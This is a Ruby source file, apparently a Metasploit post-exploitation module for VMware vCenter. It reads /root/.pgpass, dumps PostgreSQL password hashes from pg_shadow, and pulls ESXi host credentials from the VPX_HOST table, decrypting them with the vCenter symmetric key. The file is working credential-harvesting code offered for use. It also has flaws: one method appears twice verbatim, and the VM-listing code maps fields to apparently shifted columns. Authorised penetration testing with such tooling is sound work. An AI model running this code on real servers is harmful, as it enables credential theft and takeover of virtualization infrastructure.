# -*- coding: binary -*-

module Msf
  class Post
    module Vcenter
      module Database
        include Msf::Post::File

        def pgpass_file
          '/root/.pgpass'
        end

        def psql_bin
          '/opt/vmware/vpostgres/current/bin/psql'
        end

        #
        # Returns a array of hashes of the .pgpass file
        # @param location [String] where the file is located. defaults to /root/.pgpass
        # @return [Array] array of hashes of the file contents, nil on error
        #
        def process_pgpass_file(location = pgpass_file)
          return nil unless file_exist?(location)

          contents = read_file(location)
          return nil if contents.nil?
          return nil if contents.empty?

          output = []
          contents.each_line(chomp: true) do |line|
            # file format hostname:port:database:username:password
            # https://www.postgresql.org/docs/current/libpq-pgpass.html
            next unless line.include?(':') # attempt to do a little quality control

            sections = line.split(':')
            o = {}
            o['hostname'] = sections[0].strip
            o['port'] = sections[1].strip
            o['database'] = sections[2]
            o['username'] = sections[3]
            o['password'] = sections[4]

            o['port'] = '5432' if o['port'] == '*'
            output.append(o)
          end
          output
        end

        #
        # Returns a list of postgres users and password hashes from the database
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @return [Array] list of hash tables where each table is a user, nil on error
        #
        def query_pg_shadow_values(pg_password, vcdb_user, vcdb_name)
          return nil unless command_exists? psql_bin

          output = []
          postgres_users = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT usename, passwd FROM pg_shadow;' -P pager -A -t")
          return nil if postgres_users.nil?

          postgres_users = postgres_users.split("\n")
          return nil unless postgres_users.first

          postgres_users.each do |postgres_user|
            row_data = postgres_user.split('|')
            next if row_data.length < 2 # shoudld always be 2 based on query, but this will catch 'command not found' or other things like that

            user = {
              'user' => row_data[0],
              'password_hash' => row_data[1]
            }

            output.append(user)
          end
          output
        end

        #
        # Returns a list of postgres users and password hashes from the database
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @return [Array] list of hash tables where each table is a user, nil on error
        #
        def query_pg_shadow_values(pg_password, vcdb_user, vcdb_name)
          return nil unless command_exists? psql_bin

          output = []
          postgres_users = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT usename, passwd FROM pg_shadow;' -P pager -A -t")
          return nil if postgres_users.nil?

          postgres_users = postgres_users.split("\n")
          return nil unless postgres_users.first

          postgres_users.each do |postgres_user|
            row_data = postgres_user.split('|')
            next if row_data.length < 2 # shoudld always be 2 based on query, but this will catch 'command not found' or other things like that

            user = {
              'user' => row_data[0],
              'password_hash' => row_data[1]
            }

            output.append(user)
          end
          output
        end

        #
        # Returns a list of vpx users and password hashes from the database
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @param symkey [String] string of they symkey
        # @return [Array] list of hash tables where each table is a user, nil on error
        #
        def query_vpx_creds(pg_password, vcdb_user, vcdb_name, symkey = nil)
          return nil unless command_exists? psql_bin

          output = []
          vpx_creds = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT user_name, password, local_ip_address, ip_address, dns_name FROM VPX_HOST;' -P pager -A -t")
          return nil if vpx_creds.nil?

          vpx_creds = vpx_creds.split("\n")
          return nil unless vpx_creds.first

          vpx_creds.each do |vpx_user|
            row_data = vpx_user.split('|')
            next if row_data.length < 2 # shoudld always be 2 based on query, but this will catch 'command not found' or other things like that

            user = {
              'user' => row_data[0],
              'encrypted_password' => row_data[1],
              'local_ip' => row_data[2],
              'ip_address' => row_data[3],
              'dns_name' => row_data[4]
            }
            unless symkey.nil?
              # https://github.com/shmilylty/vhost_password_decrypt/blob/main/decrypt.py
              # https://pentera.io/blog/information-disclosure-in-vmware-vcenter/
              encrypted_password = row_data[1].gsub('*', '').strip
              encrypted_password = Base64.decode64(encrypted_password)
              encrypted_password = encrypted_password.scan(/.{16}/)

              iv = encrypted_password.shift
              encrypted_password = encrypted_password.join
              begin
                cipher = OpenSSL::Cipher.new('aes-256-cbc')
                cipher.decrypt
                cipher.key = [symkey.strip].pack('H*')
                cipher.iv = iv
                user['decrypted_password'] = cipher.update(encrypted_password) + cipher.final
              rescue OpenSSL::Cipher::CipherError => e
                vprint_error("Unable to decrypt password for #{user} due to OpenSSL Cipher Error: #{e}")
              end
            end

            output.append(user)
          end
          output
        end

        #
        # A helper function to return the command line statement string to connect to the postgress server
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @param vcdb_host [String] virtual center hostname. Defaults to 'localhost'
        # @return [String] a string to run on command line
        #
        def postgress_connect(pg_password, vcdb_user, vcdb_name, vcdb_host = 'localhost')
          # should come in wrapped in quotes, but if not wrap
          unless pg_password.start_with?("'") && pg_password.end_with?("'")
            pg_password = "'#{pg_password}'"
          end
          "PGPASSWORD=#{pg_password} #{psql_bin} -h '#{vcdb_host}' -U '#{vcdb_user}' -d '#{vcdb_name}'"
        end

        #
        # Returns a list of vpc customization contents
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @return [Hash] where the customization name is the key and value is the parsed xml doc, nil on error
        #
        def get_vpx_customization_spec(pg_password, vcdb_user, vcdb_name)
          return nil unless command_exists? psql_bin

          output = {}
          vpx_customization_specs = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT DISTINCT name FROM vc.vpx_customization_spec;' -P pager -A -t")
          return nil if vpx_customization_specs.nil?

          vpx_customization_specs = vpx_customization_specs.split("\n")
          return nil unless vpx_customization_specs.first

          vpx_customization_specs.each do |spec|
            xml = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c \"SELECT body FROM vpx_customization_spec WHERE name = '#{spec}\';\" -P pager -A -t").to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
            next if xml.nil?

            begin
              xmldoc = Nokogiri::XML(xml) do |config|
                config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
              end
            rescue Nokogiri::XML::SyntaxError
              print_bad("Unable to read XML from #{spec}")
              next
            end
            output[spec] = xmldoc
          end
          output
        end

        #
        # Returns a list of virtual machines located on the server
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @param _vc_sym_key [String] sym key from virtual center
        # @return [Array] list of hash tables where each table is a user, nil on error
        #
        def get_vpx_vms(pg_password, vcdb_user, vcdb_name, _vc_sym_key)
          return nil unless command_exists? psql_bin

          output = []
          vm_rows = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT vmid, name, configfilename, guest_state, is_template FROM vpxv_vms;' -P pager -A -t")
          return nil if vm_rows.nil?

          vm_rows = vm_rows.split("\n")
          return nil unless vm_rows.first

          vm_rows.each do |vm_row|
            row_data = vm_row.split('|')
            next if row_data.length < 5 # shoudld always be 5 based on query, but this will catch 'command not found' or other things like that

            vm = {
              'vmid' => row_data[0],
              'name' => row_data[1],
              'configfilename' => row_data[3],
              'guest_state' => row_data[4],
              'is_template' => row_data[5]
            }
            output.append(vm)
          end
          output
        end

        #
        # Returns a list of vpc customization contents
        # @param pg_password [String] postgress password
        # @param vcdb_user [String] virtual center database username
        # @param vcdb_name [String] virtual center database name
        # @param vc_sym_key [String] sym key from virtual center
        # @return [Array] list of hash tables where each table is a user, nil on error
        #
        def get_vpx_users(pg_password, vcdb_user, vcdb_name, vc_sym_key)
          return nil unless command_exists? psql_bin

          output = []
          vpxuser_rows = cmd_exec("#{postgress_connect(pg_password, vcdb_user, vcdb_name)} -c 'SELECT dns_name, ip_address, user_name, password FROM vc.vpx_host ORDER BY dns_name ASC;' -P pager -A -t")
          return nil if vpxuser_rows.nil?

          vpxuser_rows = vpxuser_rows.split("\n")
          return nil unless vpxuser_rows.first

          vpxuser_rows.each do |vpxuser_row|
            row_data = vpxuser_row.split('|')
            next if row_data.length < 4 # shoudld always be 4 based on query, but this will catch 'command not found' or other things like that

            user = {
              'fqdn' => row_data[0],
              'ip' => row_data[1],
              'user' => row_data[2]
            }

            vpxuser_secret_b64 = row_data[3].gsub('*', '')
            user['password'] = vpx_aes_decrypt(vpxuser_secret_b64, vc_sym_key).gsub('\"', '"')
            output.append(user)
          end
          output
        end

        #
        # helper function to decrypt passwords stored in the pg database
        # @param b64 [String] base64 string of the password exported from postgres
        # @param vc_sym_key [String] sym key from virtual center
        # @return [String] the decrypted password, nil on error

        def vpx_aes_decrypt(b64, vc_sym_key)
          # https://www.pentera.io/wp-content/uploads/2022/03/Sensitive-Information-Disclosure_VMware-vCenter_f.pdf
          secret_bytes = Base64.strict_decode64(b64)
          iv = secret_bytes[0, 16]
          ciphertext = secret_bytes[16, 64]
          decipher = OpenSSL::Cipher.new('aes-256-cbc')
          decipher.decrypt
          decipher.iv = iv
          decipher.padding = 1
          decipher.key = vc_sym_key
          return (decipher.update(ciphertext) + decipher.final).delete("\000")
        rescue StandardError => e
          elog('Error performing vpx_aes_decrypt', error: e)
          ''
        end
      end
    end
  end
end
